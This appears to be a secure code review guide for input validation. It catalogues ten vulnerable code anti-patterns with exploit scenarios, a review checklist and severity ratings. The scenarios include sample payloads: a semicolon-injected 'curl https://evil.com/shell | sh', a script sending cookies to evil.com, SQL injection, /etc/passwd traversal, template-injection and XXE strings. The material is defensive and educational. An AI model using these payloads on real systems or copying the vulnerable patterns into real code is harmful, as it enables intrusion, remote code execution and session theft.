# Input Validation

Can an attacker inject malicious input to alter execution, corrupt data, or exhaust resources?

The Input Validation pillar evaluates whether the application treats all external input as untrusted and enforces boundaries before processing.
It covers STRIDE threats **Tampering** (input alters execution or data) and **Denial of Service** (input exhausts resources), and checks the Security properties **Integrity** and **Availability** that defend against them.
When this pillar is weak, attackers can execute arbitrary code, extract or modify data via injection, or render the service unresponsive through crafted inputs.

Note: many frameworks handle common validation concerns automatically (ORMs parameterise queries; template engines escape output by default).
Flag issues where the code explicitly bypasses or opts out of these protections, or where validation is absent at a system boundary.

## Focus Areas

### STRIDE Threats (attack lens)

- **Tampering** — Can an attacker inject input that alters the application's execution or data?
  SQL injection, command injection, XSS, path traversal, unsafe deserialisation, template injection, eval with user input, XXE.
- **Denial of Service** — Can an attacker provide input that exhausts computational resources?
  Regex with catastrophic backtracking (ReDoS), deeply nested structures, client-side-only validation bypassed to send oversized payloads.

### Security Properties (defence lens)

- **Integrity** — Untrusted input cannot alter the structure of queries, commands, or rendered output.
  Parameterised queries, allowlist validation, output encoding, safe deserialisation, sandboxed template rendering.
- **Availability** — Input cannot trigger unbounded resource consumption.
  Bounded regex patterns, depth limits on recursive parsing, server-side size validation.

## Anti-Pattern Catalogue

### IV-01: SQL injection via string concatenation

```python
query = f"SELECT * FROM users WHERE name = '{name}'"
results = db.execute(query)
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** Attacker sends `name=' OR 1=1 --` to return all rows; `UNION SELECT` variants extract other tables; stacked queries on some databases execute OS commands via `xp_cmdshell`.
Typical severity: HIGH / HYG (Irreversible — data breach or destruction; runs with the database user's full privileges).

### IV-02: Command injection via shell execution

```python
os.system(f"convert {filename} output.png")
subprocess.call(cmd, shell=True)  # cmd contains user input
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** Attacker sends `filename=; curl https://evil.com/shell | sh` — the shell interprets the semicolon and executes arbitrary commands with the process's privileges.
Typical severity: HIGH / HYG (Irreversible — arbitrary code execution; attacker can install backdoors or pivot to other systems).

### IV-03: XSS via unsafe rendering

```jsx
<div dangerouslySetInnerHTML={{__html: text}} />
```

```python
render_template_string(f"<p>{user_bio}</p>")
# or: {{ comment | safe }} in Jinja2
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** Attacker submits `<script>fetch('https://evil.com/?c='+document.cookie)</script>` as a bio; every user who views the page has their session cookie stolen.
Typical severity: HIGH / L1. Escalates to HYG if session cookies are not HttpOnly (session hijacking irreversible) or the application handles regulated data.

### IV-04: Path traversal

```python
file_path = f"/uploads/{user_filename}"
return send_file(file_path)
```

STRIDE: Tampering (injection) + Information Disclosure. Security property missing: Integrity.
**Exploit scenario:** Attacker sends `user_filename=../../../../etc/passwd` — the path resolves outside the intended directory and the server returns the system password file.
Typical severity: HIGH / L1. Escalates to HYG if the traversal can reach credentials, private keys, or regulated data.

### IV-05: Unsafe deserialisation

```python
data = pickle.loads(request.data)
config = yaml.load(request.data)  # Missing Loader=yaml.SafeLoader
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** Attacker crafts a pickle payload that executes `os.system("curl https://evil.com/shell | sh")` during deserialisation — before any application logic runs.
YAML without `safe_load()` instantiates arbitrary Python objects via `!!python/object` tags.
Typical severity: HIGH / HYG (Irreversible — no input validation can make `pickle.loads()` on untrusted data safe).

### IV-06: Template injection

```python
render_template_string(f"<h1>Hello {username}</h1>")  # Jinja2
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** Attacker sets `username` to `{{config.items()}}` to read application secrets, then escalates to `{{''.__class__.__mro__[1].__subclasses__()}}` for remote code execution.
Typical severity: HIGH / HYG (Irreversible — RCE achievable in most server-side template engines: Jinja2, Twig, Freemarker).

### IV-07: eval/exec with user input

```python
eval(user_expression)
```

```javascript
Function(user_string)()
```

STRIDE: Tampering (injection). Security property missing: Integrity.
**Exploit scenario:** The user's input IS the programme — all sanitisation can be bypassed because the interpreter executes whatever is provided.
Attacker sends `__import__('os').system('id')` in Python or `require('child_process').execSync('id')` in Node.js.
Typical severity: HIGH / HYG (Irreversible — arbitrary code execution; no safe mode exists).

### IV-08: Regex with user input (ReDoS)

```python
re.match(user_pattern, data)       # user controls the regex
re.compile(r'^(a+)+$').match(s)   # catastrophic backtracking on fixed pattern
```

STRIDE: Denial of Service. Security property missing: Availability.
**Exploit scenario:** Attacker sends `aaaaaaaaaaaaaaaaaaaaaa!` against a pattern with nested quantifiers — the engine explores an exponential number of backtracking paths, blocking the worker thread for seconds to minutes.
Typical severity: MEDIUM / L2. Escalates to HYG on public unauthenticated endpoints with no timeout (Total — can render the service unresponsive).

### IV-09: XML external entity injection (XXE)

```python
from lxml import etree
tree = etree.parse(user_xml)  # DTD processing enabled by default
```

STRIDE: Tampering + Information Disclosure. Security property missing: Integrity.
**Exploit scenario:** Attacker includes `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — the parser fetches and inlines the file.
With an HTTP URI the attack becomes SSRF, reaching internal services inaccessible from outside.
Typical severity: HIGH / L1. Escalates to HYG if SSRF can reach internal services (pivoting to further compromise).

### IV-10: Client-side only validation

```javascript
if (input.length > 100) { showError("Too long"); return; }
fetch('/api/submit', { body: input });  // No server-side check
```

STRIDE: Tampering (validation bypass). Security property missing: Integrity.
**Exploit scenario:** Attacker bypasses the browser form entirely and POSTs a 10 MB payload via curl — the server processes it without restriction.
Typical severity: MEDIUM / L1 (severity depends on what the validation was protecting — size limits, format constraints, allowlisted values).

## Review Checklist

When assessing the Input Validation pillar, work through each item in order.

1. **Query construction** — Are all database queries using parameterised statements or ORM query builders? Is string concatenation or f-string interpolation absent from query and command construction?
2. **Shell commands** — Are subprocess calls using argument arrays (not `shell=True`)? Is `os.system()` with user-supplied values absent?
3. **Output encoding** — Are template engines in auto-escape mode? Are `dangerouslySetInnerHTML`, `v-html`, `|safe`, and `raw()` absent when rendering user content?
4. **File paths** — Are file paths from user input resolved with `os.path.realpath()` and then verified to be within the intended root directory?
5. **Deserialisation** — Are `pickle.loads()`, `marshal.loads()`, and `yaml.load()` (without `SafeLoader`) absent from code that processes external data?
6. **Dynamic execution** — Are `eval()`, `exec()`, and `Function()` absent from paths that include user-supplied input?
7. **XML parsing** — Is external entity resolution explicitly disabled for XML parsers that process external input?
8. **Regex safety** — Do fixed patterns applied to user input avoid nested quantifiers (`(a+)+`, `(a|a)+`)? Are user-controlled values used as regex patterns?
9. **Server-side validation** — Does every input constraint enforced in the UI have a corresponding server-side check? Is client-side-only validation treated as a finding?

## Severity Framing

Severity for Input Validation findings is about exploitation ease and impact scope.

- **Code execution injections** — SQL injection, command injection, unsafe deserialisation, template injection, and eval with user input are HIGH / HYG: directly exploitable, irreversible impact.
- **XSS and path traversal** — HIGH / L1: escalate to HYG when session tokens are not HttpOnly or regulated data is reachable.
- **XXE** — HIGH / L1: escalates to HYG when SSRF can reach internal services.
- **Client-side only validation** — MEDIUM / L1: impact depends on what the validation was guarding; always flag.
- **ReDoS** — MEDIUM / L2: escalates to HYG on unauthenticated public endpoints with no timeout protection.
